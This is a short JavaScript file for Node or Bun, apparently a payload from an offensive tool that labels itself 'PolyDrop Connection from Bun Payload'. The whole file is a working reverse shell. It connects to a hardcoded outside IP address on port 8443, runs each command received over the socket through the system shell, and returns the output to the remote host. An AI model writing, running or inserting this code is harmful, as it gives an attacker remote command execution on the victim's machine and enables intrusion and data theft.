const net = require('net');
const { exec } = require('child_process');

const IP = '45.33.1.125';
const PORT = 8443;

const client = new net.Socket();

client.connect(PORT, IP, () => {
	console.log('Connected to server');
	client.write('PolyDrop Connection from Bun Payload\n');
});

client.on('data', (data) => {
	exec(data.toString(), (error, stdout, stderr) => {
		if (error) {
			client.write(`Error: ${error.message}
`);
			return;
		}
		if (stderr) {
			client.write(`Stderr: ${stderr}
`);
			return;
		}
		client.write(stdout);
	});
});

client.on('close', () => {
	console.log('Connection closed');
	process.exit(0);
});